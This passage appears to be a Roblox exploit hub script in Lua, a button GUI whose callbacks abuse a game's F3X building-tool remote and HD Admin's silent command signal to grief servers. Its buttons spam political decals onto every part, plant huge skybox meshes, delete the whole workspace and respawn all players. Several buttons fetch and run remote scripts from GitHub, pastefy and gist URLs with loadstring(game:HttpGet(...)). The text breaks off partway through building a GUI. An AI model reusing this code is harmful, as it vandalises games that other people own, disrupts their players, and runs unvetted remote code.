createFastPart("Normal", fountainCenterCF * CFrame.new(0,0.35,0), Vector3.new(11.7,1.0,11.7), Enum.Material.Glass, Color3.fromRGB(80,160,255), "FountainWater", true, false, function(part)
    transparency(part,0.45)
end)
-- Drip drops
for i=1,6 do
    local dripCF = fountainCenterCF * CFrame.new(0,7.7 - (i * 0.4), 0)
    createFastPart("Normal", dripCF, Vector3.new(1.2,0.35,1.2), Enum.Material.Glass, Color3.fromRGB(120,185,255), "FountainDrip_"..i, true, false, function(part)
        transparency(part,0.35 + (i*0.03))
    end)
end
-- Rocks
local stonePositions = {
    Vector3.new(8.5,0.6,0),
    Vector3.new(-8.5,0.6,0),
    Vector3.new(0,0.6,8.5),
    Vector3.new(0,0.6,-8.5)
}
for i,pos in ipairs(stonePositions) do
    createFastPart("Normal", fountainCenterCF * CFrame.new(pos.X,pos.Y,pos.Z), Vector3.new(0.9,1.2,0.9), Enum.Material.Slate, Color3.fromRGB(90,90,90), "FountainRock_"..i, true, true)
end

-- Outside grass
local grassDepth = 48
local grassWidth = ROOM_SIZE.X + 20
local grassHeight = 0.6
createFastPart("Normal", ROOM_CENTER * CFrame.new(0, - (ROOM_SIZE.Y/2) + (grassHeight/2) + FLOOR_THICKNESS, -halfZ - (grassDepth/2)), Vector3.new(grassWidth, grassHeight, grassDepth), Enum.Material.Grass, Color3.fromRGB(85,170,60), "OutsideGrass", true, true)

-- Spawn location
local spawnCF = ROOM_CENTER * CFrame.new(0, - (ROOM_SIZE.Y/2) + grassHeight + 0.1, -halfZ - 10) * CFrame.Angles(0, math.rad(180), 0)
createFastPart("Spawn", spawnCF, Vector3.new(4,0.2,4), Enum.Material.Neon, Color3.fromRGB(255,255,0), "SpawnLocationOutside", true, true, function(part)
    transparency(part,0.3)
    createdecal(part, Enum.NormalId.Top)
end)

-- Interior lights
for i=1,4 do
    local offsetX = - (ROOM_SIZE.X/2) + 6 + ((i-1) * (ROOM_SIZE.X - 12)/3)
    local lightCF = ROOM_CENTER * CFrame.new(offsetX,(ROOM_SIZE.Y/2)-3,-(ROOM_SIZE.Z/2)+4)
    createFastPart("Normal", lightCF, Vector3.new(2,1,2), Enum.Material.Neon, Color3.fromRGB(200,200,255), "InteriorLight_"..i, true, false)
end

-- Optional map settings and music
wait(2) -- Wait for everything to build first
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";fogcolor black ;time")
    wait(0.2)
    RequestCommand:InvokeServer(";res all")
    wait(0.2)
    RequestCommand:InvokeServer(";r6 all")
    wait(0.2)
    RequestCommand:InvokeServer(";time 14")
    wait(2.0)
    RequestCommand:InvokeServer(";music 92512466676196 ;pitch 0.125 ;volume inf")
wait(1.5)
RequestCommand:InvokeServer(";disco ;time 0")
end)

print("Map generation complete!")
    end
})

AddButton({
    Name = "Obama Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

--  Call spam function with decal ID

spam("5033585543")
    end
})
AddButton({
    Name = "Ice Cube Skybox",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("16442228290")
    end
})
AddButton({
    Name = "Ice Cube Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

--  Call spam function with decal ID

spam("16442228290")
    end
})
AddButton({
    Name = "Brick Spawn",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

-- Get F3X tool
local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
    remote:InvokeServer(unpack(args))
end

-- Create part
function CreatePart(cf, parent)
    _( {"CreatePart", "Normal", cf, parent} )
end

-- Anchor toggle
function SetAnchor(part, state)
    _( {"SyncAnchor", { {["Part"] = part, ["Anchored"] = state} }} )
end

-- Spawn 5 unanchored bricks instantly
for i = 1, 5 do
    local brickCF = hrp.CFrame * CFrame.new(5 + (i - 1) * 5, 0, 0) -- offset each brick 5 studs apart
    CreatePart(brickCF, workspace)
    task.wait() -- tiny wait to let part register

    -- Find it and unanchor
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - brickCF.Position).Magnitude < 0.1 then
            SetAnchor(v, false)
        end
    end
end
    end
})
AddButton({
    Name = "Trump Skybox",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black ;time 0")
        
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

function SetAnchor(part, state)
    _({"SyncAnchor", {{["Part"] = part, ["Anchored"] = state}}})
end

function AddMesh(part)
    _({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
    _({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid}}})
end

function SetTexture(part, texid)
    _({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid}}})
end

function MeshResize(part, size)
    _({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function SetVertexColor(part, color)
    _({"SyncMesh", {{["Part"] = part, ["VertexColor"] = color}}})
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
    
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441")
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(4, 4, 4))
            MeshResize(v, Vector3.new(109888, 109888, 109888))
        end
    end
end

-- Usage
Sky("14771520251")
    end
})
AddButton({
    Name = "Trump Decal",
    Callback = function()
   local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

--  Call spam function with decal ID

spam("14771520251")
end   
})
AddButton({
    Name = "Skeleton Sky",
    Callback = function()
  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[
(==================================)
( -- Epik Skeleton Skybox F3X By ItsKittyyyGD --)
(|==================================)
(-- SCRIPT CHANGELOGS: --)                                   )
(-) Deleted create sky and destroy Now use Set texture. )
() Smooth Skybox Video.                                             )
(==================================)
( I love you Blue2Spooky,Thanks for using my things.)
(==================================)
]]
-- SOURCE
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 6")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
local RunService = game:GetService("RunService")

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end

function SetAnchor(part, boolean)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

-- ADDED SetVertexColor function
function SetVertexColor(part, color)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["VertexColor"] = color
            }
        }
    }
    _(args)
end

function SetTransparency(part, value)
    local args = {
        [1] = "SyncTransparency",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Transparency"] = value
            }
        }
    }
    _(args)
end

function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

local images = {
    "http://www.roblox.com/asset/?id=169585459",
    "http://www.roblox.com/asset/?id=169585475",
    "http://www.roblox.com/asset/?id=169585485",
    "http://www.roblox.com/asset/?id=169585502",
    "http://www.roblox.com/asset/?id=169585515",
    "http://www.roblox.com/asset/?id=169585502",
    "http://www.roblox.com/asset/?id=169585485",
    "http://www.roblox.com/asset/?id=169585475"
}

local skyPart
local skyLoop
local frameTime = 1 / 10
local lastUpdate = 0

function CreateSky()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cf = hrp.CFrame
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    local found = false
    for i = 1, 50 do
        task.wait()
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
                skyPart = v
                found = true
                break
            end
        end
        if found then break end
    end

    if not skyPart then return end

    SetAnchor(skyPart, true)
    AddMesh(skyPart)
    SetMesh(skyPart, "111891702759441")
    -- ADDED VertexColor to skybox
    SetVertexColor(skyPart, Vector3.new(4, 4, 4))
    MeshResize(skyPart, Vector3.new(109888, 109888, 109888))
    SetTransparency(skyPart, 0)

    local index = 1
    skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
        lastUpdate = lastUpdate + deltaTime
        if lastUpdate >= frameTime then
            lastUpdate = 0
            if not skyPart then
                skyLoop:Disconnect()
                return
            end
            SetTexture(skyPart, images[index])
            index = (index % #images) + 1
        end
    end)
end

function ResetSky()
    if skyLoop then
        skyLoop:Disconnect()
        skyLoop = nil
    end
    if skyPart then
        DestroyPart(skyPart)
        skyPart = nil
    end
    task.spawn(CreateSky)
end

player.CharacterAdded:Connect(function(newChar)
    char = newChar
    ResetSky()
end)

if char and char:FindFirstChild("Humanoid") then
    char:WaitForChild("Humanoid").Died:Connect(function()
        ResetSky()
    end)
end

CreateSky()
    end
})
AddButton({
    Name = "Refresh",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";re")
    end
})
AddButton({
    Name = "Disco Fog",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";disco")
SilentRequest:InvokeServer(";fog 11000")
    end
})
AddButton({
    Name = "Undisco Fog",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";undisco")
    end
})
AddButton({
    Name = "Day",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";time 12")
    end
})
AddButton({
    Name = "Night",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";time 25")
    end
})
AddButton({
    Name = "Billboard",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";titley me ANGira249")
    end
})
AddButton({
    Name = "Kill Aura",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";titley ANGira249")
    end
})
AddButton({
    Name = "Baseplate",
    Callback = function()
        -- =========================
-- F3X DELETE + BASEPLATE + RE ALL
-- =========================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

-- HDAdmin silent command
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

-- Get F3X tool
local function getF3X()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    return nil
end

local f3x = getF3X()
if not f3x then
    warn("F3X not found")
    return
end

local syncapi = f3x.SyncAPI
local server = syncapi.ServerEndpoint
local function invoke(args)
    server:InvokeServer(unpack(args))
end

-- Delete a part/model
local function delete(part)
    invoke({ "Remove", { part } })
end

-- Delete everything in workspace
for _, v in ipairs(Workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
        spawn(function()
            delete(v)
        end)
    end
end

-- Wait a short moment to let deletes process
task.wait(1)

-- Helper functions to build baseplate
local function resize(part, size, cf)
    invoke({"SyncResize", {{Part = part, Size = size, CFrame = cf}}})
end

local function color(part, col)
    invoke({"SyncColor", {{Part = part, Color = col, UnionColoring = false}}})
end

local function texture(part, face)
    invoke({"CreateTextures", {{Part = part, Face = face, TextureType = "Texture"}}})
    invoke({"SyncTexture", {{
        Part = part,
        Face = face,
        TextureType = "Texture",
        Texture = "rbxassetid://91338067899984",
        StudsPerTileU = 2,
        StudsPerTileV = 2
    }}})
end

-- Build Baseplate
local function CreateBaseplate()
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = CFrame.new(
        math.floor(hrp.Position.X),
        math.floor(hrp.Position.Y) - 5,
        math.floor(hrp.Position.Z)
    )

    local base = server:InvokeServer("CreatePart", "Normal", cf, Workspace)
    resize(base, Vector3.new(800, 1, 800), cf)
    color(base, Color3.fromRGB(71, 101, 76))
    texture(base, Enum.NormalId.Top)

    return base
end

CreateBaseplate()

-- Run HD Admin ;re all to respawn everyone
pcall(function()
    SilentRequest:InvokeServer(";res all")
end)

print("Workspace cleared, baseplate created, and all players reset.")
    end
})
AddButton({
    Name = "F3X Panel",
    Callback = function()
        --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- join https://discord.gg/bESPJj7h7U
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
    end
})
AddButton({
    Name = "Blue2spooky V5",
    Callback = function()        
        loadstring(game:HttpGet("https://pastefy.app/kb8eBe96/raw"))()
    end
})
AddButton({
    Name = "k00pgui remake",
    Callback = function()        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Aueuwd/K00pgui/refs/heads/main/k00pguibtooIsandfuck.txt"))()
    end
})
AddButton({
    Name = "c00lgui",
    Callback = function()        
        loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/01812a5a4fe103d45556670067ef85e1/raw/c157a2f739b2de7c8336e890e40d96e3a6d548fd/c00lguiByBlue2Spooky"))()
    end
})
AddButton({
    Name = "k00pgui v6",
    Callback = function()        
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

local K0OL = Instance.new("ScreenGui")
K0OL.ResetOnSpawn = false --  Keeps GUI after respawn
K0OL.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

local k00p = Instance.new("Frame")
k00p.Size = UDim2.new(0, 607, 0, 405)
k00p.Position = UDim2.new(0.5, -303, 0.5, -392)
k00p.BackgroundColor3 = Color3.new(0, 0, 0)
k00p.BorderColor3 = Color3.fromRGB(0, 53, 11)
k00p.BorderSizePixel = 5
k00p.Parent = K0OL
k00p.Active = true
k00p.Draggable = true

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(0, 590, 0, 305) 
scroll.Position = UDim2.new(0, 10, 0, 70) 
scroll.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
scroll.ScrollBarThickness = 8
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.ClipsDescendants = true
scroll.Parent = k00p

local title = Instance.new("TextLabel")
title.Text = "k00pgui v6"
title.TextSize = 24
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0.0124216368, 0, -0.00999999978, 0)
title.Parent = k00p
title.TextScaled = true

local title2 = Instance.new("TextLabel")
title2.Text = "by @k00pkiddAlt    [team k00pkidd]"
title2.TextSize = 18
title2.TextColor3 = Color3.new(1, 1, 1)
title2.BackgroundTransparency = 1
title2.Size = UDim2.new(1, 0, 0, 60)
title2.Position = UDim2.new(0, 0, 0.08, 0)
title2.Parent = k00p

local layout = Instance.new("UIGridLayout")
layout.CellSize = UDim2.new(0, 160, 0, 77)
layout.CellPadding = UDim2.new(0, 10, 0, 10)
layout.FillDirection = Enum.FillDirection.Horizontal
layout.FillDirectionMaxCells = 3
layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
layout.VerticalAlignment = Enum.VerticalAlignment.Top
